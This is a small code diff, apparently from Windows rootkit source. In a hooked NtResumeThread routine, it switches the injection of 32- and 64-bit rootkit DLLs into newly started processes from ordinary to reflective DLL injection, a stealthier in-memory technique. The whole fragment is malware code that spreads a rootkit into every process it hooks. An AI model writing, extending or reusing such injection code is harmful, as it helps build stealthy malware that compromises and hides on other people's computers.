@@ -282,8 +282,8 @@ static NTSTATUS NTAPI HookedNtResumeThread(HANDLE thread, PULONG suspendCount)
 		else
 		{
 			// Inject the process directly.
-			InjectDll(processId, RootkitDll32, RootkitDll32Size, 100);
-			InjectDll(processId, RootkitDll64, RootkitDll64Size, 100);
+			InjectDllReflective(processId, RootkitDll32, RootkitDll32Size, 100);
+			InjectDllReflective(processId, RootkitDll64, RootkitDll64Size, 100);
 		}
 	}
 
